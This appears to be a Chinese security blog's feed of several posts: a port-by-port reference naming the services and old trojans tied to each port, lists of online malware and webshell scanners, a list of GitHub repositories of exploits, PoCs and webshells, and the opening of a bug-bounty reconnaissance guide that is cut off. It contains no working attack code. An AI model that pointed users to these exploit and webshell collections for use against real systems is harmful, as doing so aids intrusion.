keyword">https:</span>//www.emsisoft.com/ransomware-decryption-tools/ <span class="token header-name keyword">https:</span>//www.avast.com/en-us/ransomware-decryption-tools <span class="token header-name keyword">https:</span>//www.quickheal.com/free-ransomware-decryption-tool/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见端口</title>
      <link href="/2021/09/26/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3/"/>
      <url>/2021/09/26/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p>端口：0<br>服务：Reserved<br>说明：通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。 </p><p>端口：1<br>服务：tcpmux<br>说明：这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST UUCP、NUUCP、DEMOS 、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。 </p><p>端口：7<br>服务：Echo<br>说明：能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。 </p><p>端口：19<br>服务：Character Generator<br>说明：这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。 </p><p>端口：21<br>服务：FTP<br>说明：FTP服务器所开放的端口，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口。 </p><p>端口：22<br>服务：Ssh<br>说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。 </p><p>端口：23<br>服务：Telnet<br>说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个端口。 </p><p>端口：25<br>服务：SMTP<br>说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口。 </p><p>端口：31<br>服务：MSG Authentication<br>说明：木马Master Paradise、Hackers Paradise开放此端口。 </p><p>端口：42<br>服务：WINS Replication<br>说明：WINS复制 </p><p>端口：53<br>服务：Domain Name Server（DNS）<br>说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。 </p><p>端口：67<br>服务：Bootstrap Protocol Server<br>说明：通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。 </p><p>端口：69<br>服务：Trival File Transfer<br>说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何 文件。它们也可用于系统写入文件。 </p><p>端口：79<br>服务：Finger Server<br>说明：入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。 </p><p>端口：80<br>服务：HTTP<br>说明：用于网页浏览。木马Executor开放此端口。 </p><p>端口：99<br>服务：Metagram Relay<br>说明：后门程序ncx99开放此端口。 </p><p>端口：102<br>服务：Message transfer agent(MTA)-X.400 over TCP/IP<br>说明：消息传输代理。 </p><p>端口：109<br>服务：Post Office Protocol -Version3<br>说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交 换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。 </p><p>端口：110<br>服务：SUN公司的RPC服务所有端口<br>说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等 </p><p>端口：113<br>服务：Authentication Service<br>说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在防火墙另一边与E-MAIL服务器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。 </p><p>端口：119<br>服务：Network News Transfer Protocol<br>说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。 </p><p>端口：135<br>服务：Location Service<br>说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个端口。 </p><p>端口：137、138、139<br>服务：NETBIOS Name Service<br>说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。 </p><p>端口：143<br>服务：Interim Mail Access Protocol v2<br>说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种LINUX蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。 </p><p>端口：161<br>服务：SNMP<br>说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。 </p><p>端口：177<br>服务：X Display Manager Control Protocol<br>说明：许多入侵者通过它访问X-windows操作台，它同时需要打开6000端口。 </p><p>端口：389<br>服务：LDAP、ILS<br>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。 </p><p>端口：443<br>服务：Https<br>说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。 </p><p>端口：456<br>服务：[NULL]<br>说明：木马HACKERS PARADISE开放此端口。 </p><p>端口：513<br>服务：Login,remote login<br>说明：是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。 </p><p>端口：544<br>服务：[NULL]<br>说明：kerberos kshell</p><p>端口：548<br>服务：Macintosh,File Services(AFP/IP)<br>说明：Macintosh,文件服务。 </p><p>端口：553<br>服务：CORBA IIOP （UDP）<br>说明：使用cable modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。 </p><p>端口：555<br>服务：DSF<br>说明：木马PhAse1.0、Stealth Spy、IniKiller开放此端口。 </p><p>端口：568<br>服务：Membership DPA<br>说明：成员资格 DPA。 </p><p>端口：569<br>服务：Membership MSN<br>说明：成员资格 MSN。 </p><p>端口：635<br>服务：mountd<br>说明：Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于2049端口。 </p><p>端口：636<br>服务：LDAP<br>说明：SSL（Secure Sockets layer） </p><p>端口：666<br>服务：Doom Id Software<br>说明：木马Attack FTP、Satanz Backdoor开放此端口 </p><p>端口：993<br>服务：IMAP<br>说明：SSL（Secure Sockets layer） </p><p>端口：1001、1011<br>服务：[NULL]<br>说明：木马Silencer、WebEx开放1001端口。木马Doly Trojan开放1011端口。 </p><p>端口：1024<br>服务：Reserved<br>说明：它是动态端口的开始，许多程序并不在乎用哪个端口连接网络，它们请求系统为它们分配下一个闲置端口。基于这一点分配从端口1024开始。这就是说第一个向系统发出请求的会分配到1024端口。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a 将会看到Telnet被分配1024端口。还有SQL session也用此端口和5000端口。 </p><p>端口：1025、1033<br>服务：1025：network blackjack 1033：[NULL]<br>说明：木马netspy开放这2个端口。 </p><p>端口：1080<br>服务：SOCKS<br>说明：这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。<br>端口：1170<br>服务：[NULL]<br>说明：木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此端口。 </p><p>端口：1234、1243、6711、6776<br>服务：[NULL]<br>说明：木马SubSeven2.0、Ultors Trojan开放1234、6776端口。木马SubSeven1.0/1.9开放1243、6711、6776端口。 </p><p>端口：1245<br>服务：[NULL]<br>说明：木马Vodoo开放此端口。 </p><p>端口：1433<br>服务：SQL<br>说明：Microsoft的SQL服务开放的端口。 </p><p>端口：1492<br>服务：stone-design-1<br>说明：木马FTP99CMP开放此端口。 </p><p>端口：1500<br>服务：RPC client fixed port session queries<br>说明：RPC客户固定端口会话查询 </p><p>端口：1503<br>服务：NetMeeting T.120<br>说明：NetMeeting T.120 </p><p>端口：1524<br>服务：ingress<br>说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。 </p><p>端口：1600<br>服务：issd<br>说明：木马Shivka-Burka开放此端口。 </p><p>端口：1720<br>服务：NetMeeting<br>说明：NetMeeting H.233 call Setup。 </p><p>端口：1731<br>服务：NetMeeting Audio Call Control<br>说明：NetMeeting音频调用控制。 </p><p>端口：1807<br>服务：[NULL]<br>说明：木马SpySender开放此端口。 </p><p>端口：1981<br>服务：[NULL]<br>说明：木马ShockRave开放此端口。 </p><p>端口：1999<br>服务：cisco identification port<br>说明：木马BackDoor开放此端口。 </p><p>端口：2000<br>服务：[NULL]<br>说明：木马GirlFriend 1.3、Millenium 1.0开放此端口。 </p><p>端口：2001<br>服务：[NULL]<br>说明：木马Millenium 1.0、Trojan Cow开放此端口。 </p><p>端口：2023<br>服务：xinuexpansion 4<br>说明：木马Pass Ripper开放此端口。 </p><p>端口：2049<br>服务：NFS<br>说明：NFS程序常运行于这个端口。通常需要访问Portmapper查询这个服务运行于哪个端口。 </p><p>端口：2115<br>服务：[NULL]<br>说明：木马Bugs开放此端口。 </p><p>端口：2140、3150<br>服务：[NULL]<br>说明：木马Deep Throat 1.0/3.0开放此端口。 </p><p>端口：2500<br>服务：RPC client using a fixed port session replication<br>说明：应用固定端口会话复制的RPC客户 </p><p>端口：2583<br>服务：[NULL]<br>说明：木马Wincrash 2.0开放此端口。 </p><p>端口：2801<br>服务：[NULL]<br>说明：木马Phineas Phucker开放此端口。 </p><p>端口：3024、4092<br>服务：[NULL]<br>说明：木马WinCrash开放此端口。 </p><p>端口：3128<br>服务：squid<br>说明：这是squid HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。也会看到搜索其他代理服务器的端口8000、8001、8080、8888。扫描这个端口的另一个原因是用户正在进入聊天室。其他用户也会检验这个端口以确定用户的机器是否支持代理。 </p><p>端口：3129<br>服务：[NULL]<br>说明：木马Master Paradise开放此端口。 </p><p>端口：3150<br>服务：[NULL]<br>说明：木马The Invasor开放此端口。 </p><p>端口：3210、4321<br>服务：[NULL]<br>说明：木马SchoolBus开放此端口 </p><p>端口：3333<br>服务：dec-notes<br>说明：木马Prosiak开放此端口 </p><p>端口：3389<br>服务：超级终端<br>说明：WINDOWS 2000终端开放此端口。 </p><p>端口：3700<br>服务：[NULL]<br>说明：木马Portal of Doom开放此端口 </p><p>端口：3996、4060<br>服务：[NULL]<br>说明：木马RemoteAnything开放此端口 </p><p>端口：4000<br>服务：QQ客户端<br>说明：腾讯QQ客户端开放此端口。 </p><p>端口：4092<br>服务：[NULL]<br>说明：木马WinCrash开放此端口。 </p><p>端口：4590<br>服务：[NULL]<br>说明：木马ICQTrojan开放此端口。 </p><p>端口：5000、5001、5321、50505<br>服务：[NULL]<br>说明：木马blazer5开放5000端口。木马Sockets de Troie开放5000、5001、5321、50505端口。 </p><p>端口：5400、5401、5402<br>服务：[NULL]<br>说明：木马Blade Runner开放此端口。 </p><p>端口：5550<br>服务：[NULL]<br>说明：木马xtcp开放此端口。 </p><p>端口：5569<br>服务：[NULL]<br>说明：木马Robo-Hack开放此端口。 </p><p>端口：5632<br>服务：pcAnywere<br>说明：有时会看到很多这个端口的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种服务的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含端口22的UDP数据包。 </p><p>端口：5742<br>服务：[NULL]<br>说明：木马WinCrash1.03开放此端口。 </p><p>端口：6267<br>服务：[NULL]<br>说明：木马广外女生开放此端口。 </p><p>端口：6400<br>服务：[NULL]<br>说明：木马The tHing开放此端口。 </p><p>端口：6670、6671<br>服务：[NULL]<br>说明：木马Deep Throat开放6670端口。而Deep Throat 3.0开放6671端口。 </p><p>端口：6883<br>服务：[NULL]<br>说明：木马DeltaSource开放此端口。 </p><p>端口：6969<br>服务：[NULL]<br>说明：木马Gatecrasher、Priority开放此端口。 </p><p>端口：6970<br>服务：RealAudio<br>说明：RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP-7070端口外向控制连接设置的。 </p><p>端口：7000<br>服务：[NULL]<br>说明：木马Remote Grab开放此端口。 </p><p>端口：7300、7301、7306、7307、7308<br>服务：[NULL]<br>说明：木马NetMonitor开放此端口。另外NetSpy1.0也开放7306端口。 </p><p>端口：7323<br>服务：[NULL]<br>说明：Sygate服务器端。 </p><p>端口：7626<br>服务：[NULL]<br>说明：木马Giscier开放此端口。 </p><p>端口：7789<br>服务：[NULL]<br>说明：木马ICKiller开放此端口。 </p><p>端口：8000<br>服务：OICQ<br>说明：腾讯QQ服务器端开放此端口。 </p><p>端口：8010<br>服务：Wingate<br>说明：Wingate代理开放此端口。 </p><p>端口：8080<br>服务：代理端口<br>说明：WWW代理开放此端口。 </p><p>端口：9400、9401、9402<br>服务：[NULL]<br>说明：木马Incommand 1.0开放此端口。 </p><p>端口：9872、9873、9874、9875、10067、10167<br>服务：[NULL]<br>说明：木马Portal of Doom开放此端口。 </p><p>端口：9989<br>服务：[NULL]<br>说明：木马iNi-Killer开放此端口。 </p><p>端口：11000<br>服务：[NULL]<br>说明：木马SennaSpy开放此端口。 </p><p>端口：11223<br>服务：[NULL]<br>说明：木马Progenic trojan开放此端口。 </p><p>端口：12076、61466<br>服务：[NULL]<br>说明：木马Telecommando开放此端口。 </p><p>端口：12223<br>服务：[NULL]<br>说明：木马Hack’99 KeyLogger开放此端口。 </p><p>端口：12345、12346<br>服务：[NULL]<br>说明：木马NetBus1.60/1.70、GabanBus开放此端口。 </p><p>端口：12361<br>服务：[NULL]<br>说明：木马Whack-a-mole开放此端口。 </p><p>端口：13223<br>服务：PowWow<br>说明：PowWow是Tribal Voice的聊天程序。它允许用户在此端口打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP端口等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个端口的情况。这一协议使用OPNG作为其连接请求的前4个字节。 </p><p>端口：16969<br>服务：[NULL]<br>说明：木马Priority开放此端口。 </p><p>端口：17027<br>服务：Conducent<br>说明：这是一个外向连接。这是由于公司内部有人安装了带有Conducentadbot的共享软件。Conducentadbot是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。 </p><p>端口：19191<br>服务：[NULL]<br>说明：木马蓝色火焰开放此端口。 </p><p>端口：20000、20001<br>服务：[NULL]<br>说明：木马Millennium开放此端口。 </p><p>端口：20034<br>服务：[NULL]<br>说明：木马NetBus Pro开放此端口。 </p><p>端口：21554<br>服务：[NULL]<br>说明：木马GirlFriend开放此端口。 </p><p>端口：22222<br>服务：[NULL]<br>说明：木马Prosiak开放此端口。 </p><p>端口：23456<br>服务：[NULL]<br>说明：木马Evil FTP、Ugly FTP开放此端口。 </p><p>端口：26274、47262<br>服务：[NULL]<br>说明：木马Delta开放此端口。 </p><p>端口：27374<br>服务：[NULL]<br>说明：木马Subseven 2.1开放此端口。 </p><p>端口：30100<br>服务：[NULL]<br>说明：木马NetSphere开放此端口。 </p><p>端口：30303<br>服务：[NULL]<br>说明：木马Socket23开放此端口。 </p><p>端口：30999<br>服务：[NULL]<br>说明：木马Kuang开放此端口。 </p><p>端口：31337、31338<br>服务：[NULL]<br>说明：木马BO(Back Orifice)开放此端口。另外木马DeepBO也开放31338端口。 </p><p>端口：31339<br>服务：[NULL]<br>说明：木马NetSpy DK开放此端口。 </p><p>端口：31666<br>服务：[NULL]<br>说明：木马BOWhack开放此端口。 </p><p>端口：33333<br>服务：[NULL]<br>说明：木马Prosiak开放此端口。 </p><p>端口：34324<br>服务：[NULL]<br>说明：木马Tiny Telnet Server、BigGluck、TN开放此端口。 </p><p>端口：40412<br>服务：[NULL]<br>说明：木马The Spy开放此端口。 </p><p>端口：40421、40422、40423、40426、<br>服务：[NULL]<br>说明：木马Masters Paradise开放此端口。 </p><p>端口：43210、54321<br>服务：[NULL]<br>说明：木马SchoolBus 1.0/2.0开放此端口。 </p><p>端口：44445<br>服务：[NULL]<br>说明：木马Happypig开放此端口。 </p><p>端口：50766<br>服务：[NULL]<br>说明：木马Fore开放此端口。 </p><p>端口：53001<br>服务：[NULL]<br>说明：木马Remote Windows Shutdown开放此端口。 </p><p>端口：65000<br>服务：[NULL]<br>说明：木马Devil 1.03开放此端口。 </p><p>端口：88<br>说明：Kerberos krb5。另外TCP的88端口也是这个用途。 </p><p>端口：137<br>说明：SQL Named Pipes encryption over other protocols name lookup(其他协议名称查找上的SQL命名管道加密技术)和SQL RPC encryption over other protocols name lookup(其他协议名称查找上的SQL RPC加密技术)和Wins NetBT name service(WINS NetBT名称服务)和Wins Proxy都用这个端口。 </p><p>端口：161<br>说明：Simple Network Management Protocol(SMTP)（简单网络管理协议）。 </p><p>端口：162<br>说明：SNMP Trap（SNMP陷阱） </p><p>端口：445<br>说明：Common Internet File System(CIFS)（公共Internet文件系统） </p><p>端口：464<br>说明：Kerberos kpasswd(v5)。另外TCP的464端口也是这个用途。 </p><p>端口：500<br>说明：Internet Key Exchange(IKE)（Internet密钥交换） </p><p>端口：1645、1812<br>说明：Remot Authentication Dial-In User Service(RADIUS)authentication(Routing and Remote Access)(远程认证拨号用户服务) </p><p>端口：1646、1813<br>说明：RADIUS accounting(Routing and Remote Access)(RADIUS记帐（路由和远程访问）) </p><p>端口：1701<br>说明：Layer Two Tunneling Protocol(L2TP)(第2层隧道协议) </p><p>端口：1801、3527<br>说明：Microsoft Message Queue Server(Microsoft消息队列服务器)。还有TCP的135、1801、2101、2103、2105也是同样的用途。 </p><p>端口：2504<br>说明：Network Load Balancing(网络平衡负荷) </p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 各种端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站/APP/Webshell在线查毒地址</title>
      <link href="/2021/09/26/%E7%BD%91%E7%AB%99-APP-Webshell%E5%9C%A8%E7%BA%BF%E6%9F%A5%E6%AF%92%E5%9C%B0%E5%9D%80/"/>
      <url>/2021/09/26/%E7%BD%91%E7%AB%99-APP-Webshell%E5%9C%A8%E7%BA%BF%E6%9F%A5%E6%AF%92%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h2 id="PC电脑软件在线查毒"><a href="#PC电脑软件在线查毒" class="headerlink" title="PC电脑软件在线查毒"></a>PC电脑软件在线查毒</h2><p><strong>腾讯哈勃分析系统</strong>：<a href="https://habo.qq.com/">https://habo.qq.com/</a></p><p>普通用户上传单文件不能超过30MB，使用上传必须登录</p><p><strong>VirSCAN.org</strong>：<a href="http://www.virscan.org/">http://www.virscan.org/</a></p><p>国外老牌在线扫描文件查毒网站，提供多个杀毒软件扫描功能，但限制上传单文件最大20MB。支持RAR或ZIP格式的自动解压缩，但压缩文件中不能包含超过20个文件。</p><p><strong>VirusTotal</strong>：<a href="https://www.virustotal.com/">https://www.virustotal.com/</a></p><p>也是国外老牌在线查毒网站，可惜以前有提供中文页面，但是现在没有了，只有英文页面。</p><p><strong>Metadefender Cloud</strong>：<a href="https://metadefender.opswat.com/">https://metadefender.opswat.com/</a></p><p>国外英文在线查毒网站，单文件最大140MB，除了上传文件，还可以对网站域名，哈希值，网页链接，IP等查毒。</p><p><strong>Jotti的恶意软件扫描系统</strong>：<a href="https://virusscan.jotti.org/">https://virusscan.jotti.org/</a></p><p>单文件最大250MB，一项免费服务，让您可以同时使用几个反病毒程序进行在线扫描可疑文件。</p><p><strong>魔盾安全分析</strong>：<a href="https://maldun.com/dashboard/">https://maldun.com/dashboard/</a></p><p>魔盾安全分析 (MALDUN.COM) 提供了一个免费的基于虚拟执行的恶意软件及网页链接分析平台。您可以在线上传需要分析的文件，或提交可疑的网页链接，魔盾安全分析会在虚拟环境中执行这个文件或打开链接，并对各种恶意软件行为特征进行监控和评分，从而帮助您了解该文件或链接是否隐藏了恶意代码，以及是否会对您的电脑造成危害。(支持大部分Windows文件分析，安卓APK文件分析)</p><p><strong>ANY.RUN</strong>：<a href="https://any.run/">https://any.run/</a></p><p>国外英文站，Any.Run与其他沙盒分析工具的主要区别在于，Any.Run是完全交互式的。这意味着使用Any.Run你可以上传文件，并在分析文件的同时与沙箱实时交互，而不是传统的上传文件然后等待报告。除此之外的另一大好处就是，Any.Run允许你上传需要点击按钮，启用内容或宏的恶意文档程序。</p><p><strong>ScanVir云鉴定网</strong>：<a href="http://www.scanvir.com/">http://www.scanvir.com/</a></p><p>一个免费网站，针对计算机病毒、手机病毒、可疑文件等进行检测和分析。单文件最大3MB</p><h2 id="手机APP在线查毒"><a href="#手机APP在线查毒" class="headerlink" title="手机APP在线查毒"></a>手机APP在线查毒</h2><p><strong>百度移动安全检测</strong>：<a href="http://scan.safe.baidu.com/">http://scan.safe.baidu.com</a></p><p>Android应用软件包在线查毒（APK文件格式，小于100MB）</p><p><strong>腾讯移动安全实验室</strong>：<a href="https://m.qq.com/security_lab/scans_online.jsp">https://m.qq.com/security_lab/scans_online.jsp</a></p><p>支持格式：sisx\sis\apk\jar</p><p><strong>西安交通大学sanddroid</strong>：<a href="http://sanddroid.xjtu.edu.cn/#upload">http://sanddroid.xjtu.edu.cn/#upload</a></p><p>一个自动的Android应用程序分析系统。</p><p><strong>腾讯金刚审计系统</strong>：<a href="https://service.security.tencent.com/kingkong">https://service.security.tencent.com/kingkong</a></p><h2 id="Webshell在线查毒"><a href="#Webshell在线查毒" class="headerlink" title="Webshell在线查毒"></a>Webshell在线查毒</h2><p><strong>百度WEBDIR+：</strong><a href="https://scanner.baidu.com/">https://scanner.baidu.com/</a></p><p>在线查杀木马，免费开放API支持批量检测。</p><p><strong>河马</strong>：<a href="https://n.shellpub.com/">https://n.shellpub.com</a></p><p>支持Windows、linux，支持在线查杀。拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。单文件最大支持20MB</p><p><strong>在线webshell查杀</strong>：<a href="http://tools.bugscaner.com/killwebshell/">http://tools.bugscaner.com/killwebshell/</a></p><p>允许上传文件最大2MB</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 查毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POC-漏洞-Github地址</title>
      <link href="/2021/09/24/POC-%E6%BC%8F%E6%B4%9E-Github%E5%9C%B0%E5%9D%80/"/>
      <url>/2021/09/24/POC-%E6%BC%8F%E6%B4%9E-Github%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<p>个人常用的POC-GitHub项目地址</p><h2 id="CVE、CMS、中间件漏洞检测利用合集"><a href="#CVE、CMS、中间件漏洞检测利用合集" class="headerlink" title="CVE、CMS、中间件漏洞检测利用合集"></a>CVE、CMS、中间件漏洞检测利用合集</h2><p><a href="https://github.com/lovechinacoco/https-github.com-mai-lang-chai-Middleware-Vulnerability-detection">https://github.com/lovechinacoco/https-github.com-mai-lang-chai-Middleware-Vulnerability-detection</a></p><h2 id="POC-amp-EXP仓库、hvv弹药库、Nday、1day"><a href="#POC-amp-EXP仓库、hvv弹药库、Nday、1day" class="headerlink" title="POC&amp;EXP仓库、hvv弹药库、Nday、1day"></a>POC&amp;EXP仓库、hvv弹药库、Nday、1day</h2><p><a href="https://github.com/DawnFlame/POChouse">https://github.com/DawnFlame/POChouse</a></p><h2 id="PeiQi-WIKI-POC"><a href="#PeiQi-WIKI-POC" class="headerlink" title="PeiQi-WIKI-POC"></a>PeiQi-WIKI-POC</h2><p><a href="https://github.com/PeiQi0/PeiQi-WIKI-POC">https://github.com/PeiQi0/PeiQi-WIKI-POC</a></p><blockquote><p>本地查看： 启动phpstudy，<a href="http://127.0.0.1/book/">http://127.0.0.1/book/</a></p></blockquote><h2 id="各种漏洞PoC、ExP的收集或编写"><a href="#各种漏洞PoC、ExP的收集或编写" class="headerlink" title="各种漏洞PoC、ExP的收集或编写"></a>各种漏洞PoC、ExP的收集或编写</h2><p><a href="https://github.com/coffeehb/Some-PoC-oR-ExP">https://github.com/coffeehb/Some-PoC-oR-ExP</a></p><h2 id="2020一些漏洞"><a href="#2020一些漏洞" class="headerlink" title="2020一些漏洞"></a>2020一些漏洞</h2><p><a href="https://github.com/r0eXpeR/CVE-2020">https://github.com/r0eXpeR/CVE-2020</a></p><h2 id="一些最新漏洞"><a href="#一些最新漏洞" class="headerlink" title="一些最新漏洞"></a>一些最新漏洞</h2><p><a href="https://github.com/EdgeSecurityTeam/Vulnerability">https://github.com/EdgeSecurityTeam/Vulnerability</a></p><h2 id="thinkphp-v5-x-远程代码执行漏洞-POC集合"><a href="#thinkphp-v5-x-远程代码执行漏洞-POC集合" class="headerlink" title="thinkphp v5.x 远程代码执行漏洞-POC集合"></a>thinkphp v5.x 远程代码执行漏洞-POC集合</h2><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> POC </tag>
            
            <tag> 资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC挖掘经验</title>
      <link href="/2021/09/24/SRC%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C/"/>
      <url>/2021/09/24/SRC%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>SRC漏洞挖掘经验+技巧篇</p><h2 id="漏洞挖掘的前期–信息收集"><a href="#漏洞挖掘的前期–信息收集" class="headerlink" title="漏洞挖掘的前期–信息收集"></a>漏洞挖掘的前期–信息收集</h2><h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><p>src一般都只收对应的漏洞，很多src的公告里面就会明确范围；然后我们就需要根据这些范围来确定域名。</p><p>如果src上面没有给出范围，那么需要我们去搜集，你需要知道哪些domain是该公司的，主要通过手工来查看：</p><ul><li>网站的关于页面／网站地图</li><li>whois反查</li><li>一些网站里面的跳转请求（也可以关注一下app）</li><li>还有就是百度，有些会在title 和 copyright信息里面出现该公司的信息</li><li>网站html源码：主要就是一些图片、js、css等，也会出现一些域名</li><li>apk反编译源码里面</li></ul><h3 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h3><p>工具：</p><ul><li><p>subdomain 